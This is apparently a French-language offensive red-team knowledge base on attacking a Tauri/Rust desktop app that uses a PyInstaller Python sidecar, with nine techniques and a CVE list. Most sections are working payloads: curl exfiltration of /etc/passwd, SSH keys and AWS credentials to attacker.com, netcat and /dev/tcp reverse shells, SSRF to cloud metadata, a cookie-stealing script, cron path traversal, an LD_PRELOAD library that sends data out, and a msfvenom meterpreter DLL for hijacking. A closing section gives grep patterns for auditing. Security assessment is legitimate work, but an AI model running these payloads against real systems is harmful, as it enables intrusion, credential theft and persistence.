# Sidecar Injection Attacks
> Base de connaissances offensive pour adversary-simulation-rust-react

## Vue d'ensemble

Le pipeline TypeScript → Rust → sidecar Python → subprocess expose 7 vecteurs d'injection distincts. Tauri v2 n'invoque aucun shell intermédiaire (les métacaractères shell passent littéralement), mais cette protection ne couvre pas l'injection d'arguments (CWE-88), l'utilisation de `shell=True` dans le sidecar Python, les protocoles URL dans Playwright, et les techniques de compromission du binaire sidecar. Le binaire PyInstaller est extractible en moins de 60 secondes avec des outils publics.

---

## Techniques d'attaque

### Technique 1 — subprocess.run avec shell=True (CRITIQUE)

**Vecteur** : Si le sidecar Python reçoit des arguments via `sys.argv` et les passe à `subprocess.run()` avec `shell=True`, l'injection de commandes classique (CWE-78) est possible

**Prérequis** : Code Python avec `subprocess.run(f"tool {user_input}", shell=True)` — pattern courant issu d'un développement rapide

**Payloads d'exploitation** :
```bash
# Exfiltration de fichiers sensibles
; curl attacker.com/exfil?d=$(cat /etc/passwd)
; curl attacker.com/exfil?d=$(cat ~/.ssh/id_rsa)
; curl attacker.com/exfil?d=$(cat ~/.aws/credentials)

# Reverse shell
&& nc -e /bin/sh attacker.com 4444
&& bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Exécution arbitraire via substitution
$(whoami > /tmp/out)
`id > /tmp/pwned`

# Exfiltration encodée
| base64 /etc/shadow | curl -d @- attacker.com

# Pipeline Windows
& type C:\Users\%USERNAME%\Desktop\*.txt | curl -d @- http://attacker.com
```

**Code vulnérable (cible à identifier)** :
```python
# VULNÉRABLE — à chercher dans le sidecar Python
subprocess.run(f"tool --keywords {user_input}", shell=True)
subprocess.run("scraper " + keywords, shell=True)
os.system(f"playwright {url}")
```

**Impact** : Exécution de commandes arbitraires avec les privilèges du processus sidecar

---

### Technique 2 — Injection d'arguments — argument smuggling (CWE-88)

**Vecteur** : Même sans shell, un argument commençant par `--` ou `-` est interprété comme une option par le parseur d'arguments Python (argparse, optparse). Aucun métacaractère shell requis.

**Prérequis** : Le sidecar Python reçoit des arguments qui ne sont pas préfixés par `--` (séparateur fin d'options) dans l'invocation Rust

**Payloads d'exploitation** :

| Payload | Contexte | Impact |
|---------|----------|--------|
| `--config=/tmp/evil.cfg` | Passé comme "keyword" | Chargement d'une config malveillante |
| `--output=../../etc/cron.d/evil` | Passé comme "output" | Ecriture dans un répertoire système |
| `--help` | Passé comme "keyword" | DoS — le programme affiche l'aide et quitte |
| `--version` | Passé comme "keyword" | Fuite de version (information disclosure) |
| `-o /tmp/webshell.php` | Passé comme URL | Redirection de sortie |
| `--import-module=/tmp/evil.py` | Dépend de l'outil cible | Chargement de module arbitraire |

**Test d'exploitation** :
```bash
# Si l'application Tauri passe les keywords directement comme argument :
# Payload à entrer dans le champ "keywords" de l'interface
--output=../../.bashrc
--config=/tmp/attacker.cfg
--exec=id
```

**Impact** : Chargement de configurations malveillantes, path traversal sur le chemin de sortie, DoS

---

### Technique 3 — Injection de protocoles URL via Playwright (SSRF)

**Vecteur** : `page.goto()` de Playwright n'effectue aucune validation de schéma. Les URLs passées directement créent des risques SSRF et d'accès aux fichiers locaux.

**Prérequis** : Le sidecar Python utilise Playwright pour scraper des URLs contrôlées par l'utilisateur

**Payloads d'exploitation** :
```
file:///etc/passwd               → Lecture de fichiers locaux
file:///proc/self/environ        → Fuite de variables d'environnement (clés API !)
file:///home/user/.ssh/id_rsa   → Exfiltration de clés SSH

http://169.254.169.254/latest/meta-data/iam/security-credentials/  → Vol de credentials AWS
http://[::1]:8080/admin          → SSRF vers services internes IPv6
http://0x7f000001                → Bypass par encodage hexadécimal
http://192.168.1.1/admin         → Accès routeur/services internes

javascript:void(0)               → Injection JavaScript dans le contexte navigateur
data:text/html,<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

**Impact** : SSRF complet, lecture de fichiers locaux, vol de credentials cloud, exécution JavaScript dans Playwright

---

### Technique 4 — Path traversal sur le chemin de sortie JSON

**Vecteur** : Si l'utilisateur contrôle partiellement le nom du fichier de sortie, écriture hors du répertoire prévu

**Prérequis** : Argument `--output` partiellement contrôlé par l'utilisateur, validation insuffisante

**Payloads d'exploitation** :
```bash
# Ecriture d'un cron job malveillant (Linux)
../../etc/cron.d/reverse_shell

# DLL planting (Windows)
..\..\Windows\System32\evil.dll
..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe

# Noms de devices Windows (DoS)
CON
NUL
COM1

# Symlink racing (si le répertoire de sortie est monde-accessible)
/tmp/output -> /etc/passwd  # (symlink créé avant l'écriture)
```

**Impact** : Ecriture arbitraire de fichiers, établissement de persistance via cron, DoS, escalade de privilèges

---

### Technique 5 — CVE-2024-24576 + CVE-2024-43402 — BatBadBut (Windows)

**Vecteur** : `std::process::Command` Rust sur Windows invoquant des fichiers `.bat` ou `.cmd` — `CreateProcessW` réécrit silencieusement l'appel en `cmd.exe /c <batch> <args>`, et `cmd.exe` interprète les métacaractères dans les arguments

**Prérequis** : Application Rust utilisant Rust < 1.81.0 et invoquant un fichier batch Windows

**Caractères déclencheurs** :
```
%CMDCMDLINE%   → Fuite des arguments cmd.exe
"arg" "other"  → Confusion de guillemets
^              → Escape character cmd.exe
&              → Séquence de commandes
|              → Pipe
<>             → Redirection
```

**Exploitation** :
```rust
// Rust < 1.81.0 — vulnérable si le programme est un .bat
std::process::Command::new("scraper.bat")
    .arg(user_controlled_arg)  // user_controlled_arg peut injecter des commandes
    .spawn();
```

**Impact** : Injection de commandes sur Windows via les métacaractères cmd.exe, CVSS 10.0

**CVE associés** : CVE-2024-24576 (CVSS 10.0), CVE-2024-43402 (correctif incomplet)

---

### Technique 6 — Extraction PyInstaller et remplacement de binaire

**Vecteur A — Extraction du code source** :

L'extraction du code source depuis un binaire PyInstaller est réalisable en moins de 60 secondes :

```bash
# pyinstxtractor — extraction des .pyc
python pyinstxtractor.py sidecar.exe
# Résultat : répertoire sidecar.exe_extracted/ avec tous les .pyc

# pyinstxtractor-ng — fonctionne sans Python, déchiffre auto les archives chiffrées
./pyinstxtractor-ng sidecar.exe

# Décompilation bytecode Python avec PyLingual (77-87% de succès Python 3.6-3.13)
# Présenté à IEEE S&P 2025 et BlackHat USA 2024
python pylingual.py sidecar.exe_extracted/main.pyc

# Outils alternatifs
uncompyle6 sidecar.exe_extracted/main.pyc   # Python <= 3.8
pycdc sidecar.exe_extracted/main.pyc        # Python 3.9-3.12
```

**Note** : L'option `--key` de chiffrement PyInstaller a été **complètement supprimée dans PyInstaller 6.0.0** — elle était déchiffrée automatiquement par pyinstxtractor-ng (clé AES stockée dans `pyimod00_crypto_key`).

**Vecteur B — Remplacement du binaire sidecar** :

```bash
# Identifier le chemin exact du sidecar Tauri
find ~/.local/share/NOM_APP/ -name "*.pyc" -o -name "sidecar*" 2>/dev/null
find "C:\Users\%USERNAME%\AppData\Local\NOM_APP\" -name "sidecar*"

# Remplacer le binaire par un binaire malveillant
cp evil_sidecar.exe ~/.local/share/NOM_APP/binaries/sidecar-x86_64-unknown-linux-gnu

# Si aucune vérification d'intégrité SHA-256 n'est implémentée côté Rust,
# le binaire malveillant s'exécute avec les mêmes privilèges que l'application
```

**Vecteur C — CVE-2025-59042 — injection via `_MEIPASS`** :

```bash
# PyInstaller < 6.10.0 — une entrée transitoire dans sys.path permet
# le chargement d'un module arbitraire via un répertoire crafté adjacent

# Créer un module malveillant dans le même répertoire que l'exécutable
echo "import os; os.system('calc.exe')" > urllib.py
# Placer ce fichier dans le même répertoire que le sidecar PyInstaller
# Lors du bootstrap, le faux urllib.py est importé avant le vrai module

# Si le sidecar s'exécute avec des privilèges élevés → escalade de privilèges locale
```

**Impact** : Lecture complète du code source, remplacement silencieux du binaire, escalade de privilèges locale

**CVE associés** : CVE-2025-59042 (CVSS 7.0, septembre 2025), CVE-2019-16784, CVE-2023-49797

---

### Technique 7 — DLL hijacking Windows via `_MEIPASS`

**Vecteur** : Sur Windows, le DLL search order place le répertoire local avant les répertoires système. Un attaquant plaçant une DLL malveillante dans le même répertoire que l'exécutable PyInstaller provoque son chargement à la place de la version système.

**DLLs cibles** :
```
urlmon.dll      → Utilisé par PyInstaller pour les téléchargements
msvcp140.dll    → Runtime C++ Visual
vcruntime140.dll → Runtime C++ Visual
WebView2Loader.dll → Runtime Tauri WebView2
python3X.dll    → Runtime Python (si PyInstaller --onefile non utilisé)
```

**Exploitation** :
```batch
rem Créer une DLL malveillante
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f dll > urlmon.dll

rem Placer la DLL dans le même répertoire que le sidecar
copy urlmon.dll "C:\Users\victim\AppData\Local\NOM_APP\binaries\"

rem Au prochain lancement du sidecar, la DLL malveillante est chargée
```

**Impact** : Exécution de code arbitraire avec les privilèges du processus sidecar, persistance

---

### Technique 8 — Injection via variables d'environnement

**Vecteur** : Si Rust ne purge pas l'environnement avant le lancement du sidecar, un attaquant local peut exploiter des variables critiques

**Prérequis** : Le sidecar n'est pas lancé via `Command::new_sidecar()` de Tauri (qui purge l'env par défaut) mais via un `std::process::Command` manuel sans `env_clear()`

**Variables à injecter** :
| Variable | OS | Impact |
|----------|-----|--------|
| `LD_PRELOAD=/tmp/evil.so` | Linux | Chargement d'une bibliothèque malveillante — hijack complet du processus |
| `DYLD_INSERT_LIBRARIES=/tmp/evil.dylib` | macOS | Equivalent macOS de LD_PRELOAD |
| `PYTHONPATH=/tmp/evil_modules/` | Tous | Chargement de modules Python malveillants (ex: faux `subprocess.py`) |
| `PYTHONHOME=/tmp/fake_python/` | Tous | Redirection de la bibliothèque standard entière |
| `PATH=/tmp/evil_bin:$PATH` | Tous | Substitution d'exécutables dans subprocess |
| `HTTP_PROXY=http://attacker.com:8080` | Tous | Interception du trafic HTTP du sidecar |

**Exploitation sur Linux** :
```bash
# Créer une bibliothèque malveillante
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor)) void init() {
    system("curl attacker.com/exfil?d=$(cat /etc/passwd | base64)");
}
EOF
gcc -shared -fPIC /tmp/evil.c -o /tmp/evil.so

# Si Rust ne purge pas l'env :
LD_PRELOAD=/tmp/evil.so /path/to/tauri-app
```

**Note** : Tauri v2 via `Command::new_sidecar()` purge l'environnement par défaut (`env_clear()`). Le vecteur s'applique uniquement si le développeur a utilisé `std::process::Command` manuellement sans purge.

---

### Technique 9 — Code signing bypass et anti-reverse engineering bypass

**Vecteur A — Suppression de la vérification de signature** :

Sur macOS, si le Hardened Runtime n'est pas configuré correctement, `DYLD_INSERT_LIBRARIES` fonctionne malgré la signature :
```bash
# Si l'entitlement dangereux est présent dans l'app Tauri :
# com.apple.security.cs.allow-dyld-environment-variables = true
DYLD_INSERT_LIBRARIES=/tmp/evil.dylib open NOM_APP.app
```

**Vecteur B — Analyse anti-debug bypass** :

Les techniques anti-debug implémentées dans le binaire Rust (secmem-proc, debugoff) sont contournables :
```bash
# secmem-proc utilise PT_DENY_ATTACH sur macOS — bypass via SIP désactivé
# ou via processus fils (fork avant l'attach)

# Sur Linux : TracerPid check dans /proc/PID/status est contournable
# en patchant le binaire pour ignorer ce check

# Sur Windows : IsDebuggerPresent() est contournable via NtSetInformationThread
# avec ThreadHideFromDebugger

# Binary Ninja + IDARustler 2025 : identification des fonctions Rust même stripées
# par hashes de patterns connus
```

**Vecteur C — Extraction des panic strings (information disclosure)** :

Même dans un binaire Rust strippé, les panic strings révèlent la structure interne :
```bash
# Extraire les chemins de fichiers source depuis le binaire
strings sidecar-binary | grep '\.rs:'
# Résultat : src/api/auth.rs:42, src/sidecar/main.rs:156, etc.

# Script Binary Ninja documenté par Cindy Xiao :
# extraction automatique de tous les chemins source + messages de panic
# même dans des binaires avec strip = "symbols"
```

**Vecteur D — Nuitka vs PyInstaller : difficulté d'analyse** :

```bash
# PyInstaller : extraction triviale
python pyinstxtractor.py sidecar → code source lisible en 60 secondes

# Nuitka : binaire natif C compilé — nécessite RE binaire natif (IDA Pro, Ghidra)
# Noms de variables disparaissent, flux de contrôle devient natif
# PyLingual ne fonctionne pas sur du code Nuitka (pas de bytecode Python)
```

---

## CVEs et références

| CVE | Composant | CVSS | Date | Impact |
|-----|-----------|------|------|--------|
| CVE-2025-59042 | PyInstaller < 6.10.0 | 7.0 | Septembre 2025 | Injection code bootstrap via manipulation sys.path dans _MEIPASS |
| CVE-2024-24576 | Rust std::process::Command Windows | 10.0 | 2024 | BatBadBut — injection de commandes via fichiers .bat/.cmd |
| CVE-2024-43402 | Rust std::process::Command Windows | — | 2024 | Correctif incomplet de CVE-2024-24576 |
| CVE-2025-31477 | tauri-plugin-shell < 2.2.1 | 9.3/9.8 | Avril 2025 | RCE via protocoles non validés dans open |
| CVE-2025-59288 | Playwright < 1.55.1 | 5.3 | Octobre 2025 | Téléchargement navigateur non sécurisé (curl -k) sur macOS |
| CVE-2023-49797 | PyInstaller | — | 2023 | Faiblesses dans le répertoire temporaire _MEIPASS |
| CVE-2019-16784 | PyInstaller | 7.0 | 2019 | TOCTOU dans _MEIPASS — permissions répertoire Windows |

---

## Patterns de recherche (grep)

```bash
# Vecteur A — subprocess shell=True dans le sidecar Python
grep -rn 'shell=True' *.py sidecar/
grep -rn 'os\.system(' *.py sidecar/
grep -rn 'os\.popen(' *.py sidecar/
grep -rn 'commands\.' *.py sidecar/

# Vecteur B — injection d'arguments (absence de séparateur --)
grep -rn 'sys\.argv' *.py sidecar/
grep -rn 'allow_abbrev' *.py sidecar/   # Devrait être False
grep -rn 'args\[' *.py sidecar/ | grep -v 'validated\|sanitize\|starts_with.*-'

# Vecteur C — validation URL Playwright
grep -rn 'page\.goto\|browser\.goto' *.py sidecar/
grep -rn 'goto.*argv\|goto.*args' *.py sidecar/

# Vecteur D — path traversal sortie
grep -rn 'open.*args\|write.*args' *.py sidecar/ | grep -v 'canonicalize\|starts_with'
grep -rn 'output.*path\|save.*path' *.py sidecar/

# Vecteur F — BatBadBut Windows (Rust)
grep -rn 'Command::new.*\.bat\|Command::new.*\.cmd' src-tauri/src/
grep -n 'rust.*version\|toolchain' rust-toolchain.toml Cargo.toml   # Doit être >= 1.81.0

# Vecteur G — binaire PyInstaller sans vérification SHA-256
grep -rn 'verify_sidecar\|sidecar.*hash\|sha256.*sidecar' src-tauri/src/
# Absence de résultat = vérification manquante

# Vecteur E — purge de l'environnement avant sidecar
grep -rn 'env_clear\|Command::new.*env' src-tauri/src/
grep -rn 'LD_PRELOAD\|DYLD_INSERT\|PYTHONPATH' src-tauri/src/

# Vecteur H — DLL hijacking Windows
grep -rn 'SetDefaultDllDirectories\|LOAD_LIBRARY_SEARCH_SYSTEM32' src-tauri/src/

# PyInstaller version (CVE-2025-59042 si < 6.10.0)
grep -rn 'pyinstaller' requirements.txt requirements-dev.txt Pipfile *.spec

# Playwright version (CVE-2025-59288 si < 1.55.1)
grep -rn 'playwright' requirements.txt requirements-dev.txt Pipfile

# args: true dans les capabilities Tauri (permet injection arbitraire)
grep -rn '"args":\s*true' src-tauri/capabilities/

# Absence de validation regex sur les arguments sidecar
grep -rn 'validator' src-tauri/capabilities/ | grep -v '^$'
# Si peu ou pas de validators → arguments non validés

# Rust version (CVE-2024-24576 si < 1.81.0)
cat rust-toolchain.toml 2>/dev/null || rustc --version
```
